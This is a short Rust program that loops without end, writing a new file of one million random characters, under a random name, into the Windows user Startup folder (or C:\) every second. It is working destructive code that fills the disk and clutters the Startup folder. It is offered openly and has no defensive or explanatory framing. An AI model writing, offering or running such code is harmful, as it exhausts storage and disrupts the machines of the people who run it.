use std::fs::File;
use std::io::prelude::*;
use std::env;
use std::path::Path;
use rand::Rng;
use std::{thread, time};

fn main() -> std::io::Result<()> {
    loop {
        generate_files()?;
        // Sleep for a short period (optional) to avoid overwhelming the system
        thread::sleep(time::Duration::from_secs(1)); // Adjust time as needed
    }
}

fn generate_files() -> std::io::Result<()> {
    // Use a default path (can be modified to any other directory)
    let startup_folder = env::var("APPDATA")
        .map(|appdata| Path::new(&appdata).join("Microsoft\\Windows\\Start Menu\\Programs\\Startup"))
        .unwrap_or_else(|_| Path::new("C:\\").to_path_buf());

    // Generate a random string for the file name
    let random_filename = generate_random_filename();
    
    // Set the random file path in the Startup folder
    let file_path = startup_folder.join(random_filename);

    // Generate a million random characters
    let random_content = generate_random_content(1_000_000);

    // Create the file and write the random content to it
    let mut file = File::create(file_path)?;
    file.write_all(random_content.as_bytes())?;

    Ok(())
}

// Function to generate a random filename
fn generate_random_filename() -> String {
    let mut rng = rand::thread_rng();
    let random_str: String = (0..10)
        .map(|_| rng.sample(rand::distributions::Alphanumeric) as char)
        .collect();
    format!("{}.{}", random_str, random_str)
}

// Function to generate a string of random characters with the specified length
fn generate_random_content(length: usize) -> String {
    let mut rng = rand::thread_rng();
    (0..length)
        .map(|_| rng.sample(rand::distributions::Alphanumeric) as char)
        .collect()
}
